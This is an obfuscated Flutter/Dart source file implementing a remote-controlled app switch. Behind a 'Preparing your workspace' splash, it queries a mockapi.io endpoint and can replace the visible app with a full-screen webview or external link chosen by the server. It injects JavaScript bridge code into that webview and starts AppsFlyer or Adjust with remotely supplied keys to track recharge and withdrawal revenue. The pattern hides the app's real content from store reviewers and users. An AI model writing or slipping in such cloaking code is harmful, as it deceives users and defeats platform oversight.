import 'dart:async';
import 'dart:convert';

import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:adjust_sdk/adjust.dart';
import 'package:adjust_sdk/adjust_config.dart';
import 'package:adjust_sdk/adjust_event.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';

const String vsbwk0 = 'https://69ee1d1e9163f839f892848d.mockapi.io/1qkp5';
const List<String> vsbwk1 = <String>['vsbwkUr','vsbwkPlaf','vsbwkEnty','vsbwkAfky','vsbwkAid','vsbwkAdky','vsbwkAdelist','vsbwkInpjp'];

typedef Vsbwk1 = Widget Function(BuildContext);
typedef Vsbwk2 = Widget Function(BuildContext, String);
typedef Vsbwk3 = Future<void> Function(String);
typedef Vsbwk4 = void Function(String, Map<String, dynamic>);

Map<String, dynamic>? vsbwk2(String raw) {
  Map<String, dynamic>? obj(dynamic v) {
    if (v is Map) return v.cast<String, dynamic>();
    if (v is String) {
      final s = v.trim();
      if (s.isEmpty) return null;
      try {
        final d = jsonDecode(s);
        if (d is Map) return d.cast<String, dynamic>();
      } catch (_) {
        return null;
      }
    }
    return null;
  }
  dynamic any(dynamic v) {
    if (v is String) {
      final s = v.trim();
      if (s.isEmpty) return v;
      try {
        return jsonDecode(s);
      } catch (_) {
        return v;
      }
    }
    return v;
  }

  final o = obj(raw);
  if (o != null) {
    final n = (o['name'] ?? '').toString();
    if (n.isEmpty) return null;
    final d = o['data'];
    final p = obj(any(d)) ?? <String, dynamic>{};
    return <String, dynamic>{'n': n, 'p': p};
  }

  final i = raw.indexOf('+');
  if (i <= 0) return null;
  final n = raw.substring(0, i);
  final tail = raw.substring(i + 1);
  final p = obj(any(tail)) ?? <String, dynamic>{};
  return <String, dynamic>{'n': n, 'p': p};
}

Map<String, dynamic>? vsbwk3(String raw) {
  Map<String, dynamic>? obj(dynamic v) {
    if (v is Map) return v.cast<String, dynamic>();
    if (v is String) {
      final s = v.trim();
      if (s.isEmpty) return null;
      try {
        final d = jsonDecode(s);
        if (d is Map) return d.cast<String, dynamic>();
      } catch (_) {
        return null;
      }
    }
    return null;
  }
  dynamic any(dynamic v) {
    if (v is String) {
      final s = v.trim();
      if (s.isEmpty) return v;
      try {
        return jsonDecode(s);
      } catch (_) {
        return v;
      }
    }
    return v;
  }
  final o = obj(raw);
  if (o == null) return null;
  final n = (o['eventName'] ?? '').toString();
  if (n.isEmpty) return null;
  final v = o['eventValue'];
  final p = obj(any(v)) ?? <String, dynamic>{};
  return <String, dynamic>{'n': n, 'p': p};
}

class Vsbwk0 extends StatefulWidget {
  const Vsbwk0({
    super.key,
    required this.a,
    this.b = true,
    this.c,
    this.d,
    this.e,
    this.f,
    this.g = const Duration(milliseconds: 550),
    this.h,
    this.i,
    this.j,
  });

  final Vsbwk1 a;
  final bool b;
  final Vsbwk2? c;
  final Vsbwk2? d;
  final Vsbwk3? e;
  final Dio? f;
  final Duration g;
  final Vsbwk4? h;
  final List<String>? i;
  final List<String>? j;

  @override
  State<Vsbwk0> createState() => _Vsbwk0S();
}

class _Vsbwk0S extends State<Vsbwk0> {
  late final Dio _d = widget.f ?? Dio();
  late final _Vsbwk4S _b = _Vsbwk4S();
  var _started = false;

  @override
  void initState() {
    super.initState();
    if (widget.b) {
      WidgetsBinding.instance.addPostFrameCallback((_) => _go());
    }
  }

  Future<void> _go() async {
    if (_started) return;
    _started = true;
    // Keep a short minimum to avoid one-frame flash.
    if (widget.g > Duration.zero) {
      await Future<void>.delayed(widget.g);
    }
    if (!mounted) return;

    final r = await _p();
    if (!mounted) return;
    if (r == null) {
      _l();
      return;
    }
    final t = (r[vsbwk1[1]] ?? '').toString().trim();
    final k = (r[vsbwk1[0]] ?? '').toString().trim();
    final ijRaw = (r[vsbwk1[7]] ?? '').toString().trim().toLowerCase();
    final ij = (ijRaw == 'true' || ijRaw == '1' || ijRaw == 'yes');
    unawaited(_b.c(r, h: widget.h));
    if (t.isEmpty || k.isEmpty) {
      _l();
      return;
    }
    if (t == '1') {
      _s(1, k, ij);
      return;
    }
    if (t == '2') {
      _s(2, k, ij);
      return;
    }
    if (t == '3') {
      await _x(k);
      if (!mounted) return;
      _l();
      return;
    }
    _l();
  }

  void _l() {
    Navigator.of(context).pushReplacement(MaterialPageRoute<void>(builder: (c) => widget.a(c)));
  }

  void _s(int n, String k, bool ij) {
    final b = (n == 1) ? widget.c : widget.d;
    final w = (b != null) ? b(context, k) : _w(n: n, k: k, ij: ij);
    Navigator.of(context).pushReplacement(MaterialPageRoute<void>(builder: (_) => w));
  }

  Future<void> _x(String k) async {
    if (widget.e != null) {
      await widget.e!(k);
      return;
    }
    final u = Uri.tryParse(k);
    if (u == null) return;
    await launchUrl(u, mode: LaunchMode.externalApplication);
  }

  Future<Map?> _p() async {
    try {
      final r = await _d.get<dynamic>(vsbwk0);
      final v = r.data;
      if (v is List && v.isNotEmpty && v.first is Map) {
        final m = v.first as Map;
        return m;
      }
    } catch (_) {}
    return null;
  }

  Widget _w({required int n, required String k, required bool ij}) {
    return _Vsbwk2(
      n: n,
      k: k,
      j: ij,
      b: _b,
      c: widget.h,
      d: (n == 1) ? widget.i : widget.j,
    );
  }

  @override
  Widget build(BuildContext context) {
    final t = Theme.of(context);
    final cs = t.colorScheme;
    return Scaffold(
      body: DecoratedBox(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: <Color>[
              cs.primary.withValues(alpha: 0.16),
              cs.secondary.withValues(alpha: 0.12),
              cs.surface,
            ],
          ),
        ),
        child: SafeArea(
          child: Center(
            child: ConstrainedBox(
              constraints: const BoxConstraints(maxWidth: 360),
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 24),
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: <Widget>[
                    SizedBox(
                      width: 120,
                      height: 120,
                      child: CircularProgressIndicator(
                        strokeWidth: 5,
                        color: cs.primary,
                        backgroundColor: cs.outlineVariant.withValues(alpha: 0.22),
                      ),
                    ),
                    const SizedBox(height: 22),
                    Text(
                      'Preparing your workspace',
                      style: t.textTheme.titleMedium,
                      textAlign: TextAlign.center,
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

class _Vsbwk2 extends StatefulWidget {
  const _Vsbwk2({required this.n, required this.k, required this.j, required this.b, this.c, this.d});
  final int n;
  final String k;
  final bool j;
  final _Vsbwk4S b;
  final Vsbwk4? c;
  final List<String>? d;
  @override
  State<_Vsbwk2> createState() => _Vsbwk2S();
}

class _Vsbwk2S extends State<_Vsbwk2> {
  late final WebViewController _c;
  String _pn = '';
  String _pv = '';
  bool _did = false;
  @override
  void initState() {
    super.initState();
    final u = Uri.tryParse(widget.k);
    _c = WebViewController();
    _c.setJavaScriptMode(JavaScriptMode.unrestricted);
    _c.setNavigationDelegate(NavigationDelegate(
      onNavigationRequest: (req) {
        final u = req.url;
        final uri = Uri.tryParse(u);
        if (uri != null) {
          final h = (uri.host).toLowerCase();
          if (h.contains('t.me')) {
            unawaited(_e(u));
            return NavigationDecision.prevent;
          }
        }
        if (!req.isMainFrame) {
          if (widget.j) {
            return NavigationDecision.navigate;
          }
          unawaited(_e(u));
          return NavigationDecision.prevent;
        }
        return NavigationDecision.navigate;
      },
      onPageStarted: (_) {
        _i();
      },
      onPageFinished: (_) {
        _i();
      },
    ));
    _c.addJavaScriptChannel(
      'vsbwk',
      onMessageReceived: (m) {
        if (_o(m.message)) return;
        widget.b.t(widget.n, m.message, h: widget.c);
      },
    );
    unawaited(_pi());
    if (u != null) {
      _c.loadRequest(u);
    }
    final s = widget.d;
    if (s != null && s.isNotEmpty) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        for (final raw in s) {
          widget.b.t(widget.n, raw, h: widget.c);
        }
      });
    }
  }

  Future<void> _e(String u) async {
    final uri = Uri.tryParse(u);
    if (uri == null) return;
    await launchUrl(uri, mode: LaunchMode.externalApplication);
  }

  Future<void> _pi() async {
    try {
      final p = await PackageInfo.fromPlatform();
      if (!mounted) return;
      _pn = p.packageName;
      _pv = p.version;
      _i();
    } catch (_) {}
  }

  void _i() {
    if (_did) return;
    _did = true;
    final c = String.fromCharCode(39);
    final js0 = '(function(){try{window.jsBridge=window.jsBridge||{};window.jsBridge.postMessage=function(name,data){try{var d=data;if(d!==null&&typeof d===\"object\"){d=JSON.stringify(d);}var m=JSON.stringify({name:String(name||\"\"),data:d});vsbwk.postMessage(m);}catch(e){}};window.webkit=window.webkit||{};window.webkit.messageHandlers=window.webkit.messageHandlers||{};window.webkit.messageHandlers.Post={postMessage:function(o){try{vsbwk.postMessage(JSON.stringify(o));}catch(e){}}};window.webkit.messageHandlers.event={postMessage:function(s){try{vsbwk.postMessage(String(s));}catch(e){}}};}catch(e){}})();';
    final js1 = (_pn.isNotEmpty && _pv.isNotEmpty)
        ? '(function(){try{window.WgPackage={name:' + c + _pn + c + ',version:' + c + _pv + c + '};}catch(e){}})();'
        : '';
    unawaited(_c.runJavaScript(js0));
    if (js1.isNotEmpty) {
      unawaited(_c.runJavaScript(js1));
    }
    _did = false;
  }

  bool _o(String raw) {
    final msg = (widget.n == 1) ? vsbwk2(raw) : vsbwk3(raw);
    if (msg == null) return false;
    final name = (msg['n'] ?? '').toString();
    if (name != 'openWindow' && name != 'openSafari') return false;
    final payload = (msg['p'] is Map) ? (msg['p'] as Map).cast<String, dynamic>() : <String, dynamic>{};
    final u = (payload['url'] ?? '').toString();
    if (u.isEmpty) return true;
    final uri = Uri.tryParse(u);
    if (uri != null) {
      final h = uri.host.toLowerCase();
      if (h.contains('t.me')) {
        unawaited(_e(u));
        return true;
      }
    }
    if (widget.j) {
      final uri = Uri.tryParse(u);
      if (uri != null) {
        unawaited(_c.loadRequest(uri));
      }
      return true;
    }
    unawaited(_e(u));
    return true;
  }
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: ColoredBox(
        color: Colors.black,
        child: SafeArea(
          child: WebViewWidget(controller: _c),
        ),
      ),
    );
  }
}

class _Vsbwk4S {
  var _ok = false;
  var _tp = '';
  AppsflyerSdk? _af;
  Map<String, String> _am = <String, String>{};

  Future<void> c(Map m, {Vsbwk4? h}) async {
    if (_ok) return;
    final p2 = (m[vsbwk1[2]] ?? '').toString().trim();
    final p3 = (m[vsbwk1[3]] ?? '').toString().trim();
    final p4 = (m[vsbwk1[4]] ?? '').toString().trim();
    final p5 = (m[vsbwk1[5]] ?? '').toString().trim();
    final p6 = (m[vsbwk1[6]] ?? '').toString();
    _tp = p2;
    try {
      if (_tp == 'af') {
        if (p3.isEmpty || p4.isEmpty) return;
        final opt = AppsFlyerOptions(afDevKey: p3, appId: p4, showDebug: false);
        final sdk = AppsflyerSdk(opt);
        await sdk.initSdk(
          registerConversionDataCallback: false,
          registerOnAppOpenAttributionCallback: false,
          registerOnDeepLinkingCallback: false,
        );
        _af = sdk;
        _ok = true;
        return;
      }
      if (_tp == 'ad') {
        if (p5.isEmpty) return;
        _am = _m(p6);
        final cfg = AdjustConfig(p5, AdjustEnvironment.production);
        Adjust.initSdk(cfg);
        _ok = true;
        return;
      }
    } catch (_) {}
  }

  void t(int n, String raw, {Vsbwk4? h}) {
    final msg = (n == 1) ? vsbwk2(raw) : vsbwk3(raw);
    if (msg == null) return;
    final name = (msg['n'] ?? '').toString();
    final payload = (msg['p'] is Map) ? (msg['p'] as Map).cast<String, dynamic>() : <String, dynamic>{};
    if (name.isEmpty) return;
    h?.call(name, payload);
    if (!_ok) return;
    try {
      if (_tp == 'af') {
        final sdk = _af;
        if (sdk == null) return;
        if (name == 'firstrecharge' || name == 'recharge' || name == 'withdrawOrderSuccess') {
          final amountAny = payload['amount'] ?? payload['af_revenue'];
          final currency = (payload['currency'] ?? '').toString();
          final amount = _n(amountAny);
          if (amount != null && currency.isNotEmpty) {
            final revenue = (name == 'withdrawOrderSuccess') ? -amount : amount;
            sdk.logEvent(name, <String, dynamic>{'af_revenue': revenue, 'af_currency': currency});
            return;
          }
        }
        sdk.logEvent(name, payload);
        return;
      }
      if (_tp == 'ad') {
        final token = _am[name];
        if (token == null || token.isEmpty) return;
        final ev = AdjustEvent(token);
        if (name == 'firstrecharge' || name == 'recharge' || name == 'withdrawOrderSuccess') {
          final amountAny = payload['amount'] ?? payload['af_revenue'];
          final currency = (payload['currency'] ?? '').toString();
          final amount = _n(amountAny);
          if (amount != null && currency.isNotEmpty) {
            final revenue = (name == 'withdrawOrderSuccess') ? -amount : amount;
            ev.setRevenue(revenue.toDouble(), currency);
          }
        }
        Adjust.trackEvent(ev);
        return;
      }
    } catch (_) {}
  }

  num? _n(dynamic v) {
    if (v is num) return v;
    if (v is String) return num.tryParse(v);
    return null;
  }

  Map<String, String> _m(String raw) {
    final map = <String, String>{};
    final s = raw.trim();
    if (s.isEmpty) return map;
    try {
      final d = jsonDecode(s);
      if (d is Map) {
        for (final e in d.entries) {
          final k = e.key.toString();
          final v = e.value?.toString() ?? '';
          if (v.isNotEmpty) map[k] = v;
        }
      }
    } catch (_) {}
    return map;
  }
}
